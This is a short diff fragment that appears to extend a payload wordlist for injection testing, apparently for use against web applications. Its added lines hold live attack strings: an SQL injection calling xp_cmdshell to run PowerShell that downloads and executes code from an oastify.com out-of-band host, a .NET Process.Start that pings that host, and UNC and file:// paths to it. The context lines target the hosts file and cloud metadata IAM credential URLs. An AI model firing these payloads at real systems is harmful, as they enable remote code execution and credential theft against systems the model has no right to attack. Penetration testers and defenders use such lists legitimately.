@@ -79,3 +79,15 @@ C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts
 "file://qf9f5djh9mtu085bstr8b3dlvc13pudj.oastify.com/share/file"
 "http://instance-data/latest/meta-data/iam/security-credentials/"
 "http://s3.amazonaws.com/iam/policy"
+
+
+
+
+
+
+
+
+"'; EXEC xp_cmdshell 'powershell -c \"IEX (New-Object Net.WebClient).DownloadString(\"http://514urs5wv1f9mnrqe8dnxiz0hrnjb9zy.oastify.com/test\")"\"--"
+"System.Diagnostics.Process.Start(\"cmd.exe\",\"/c ping 514urs5wv1f9mnrqe8dnxiz0hrnjb9zy.oastify.com\")"
+"\\\\514urs5wv1f9mnrqe8dnxiz0hrnjb9zy.oastify.com\\share\\file"
+"file://514urs5wv1f9mnrqe8dnxiz0hrnjb9zy.oastify.com/share/file"
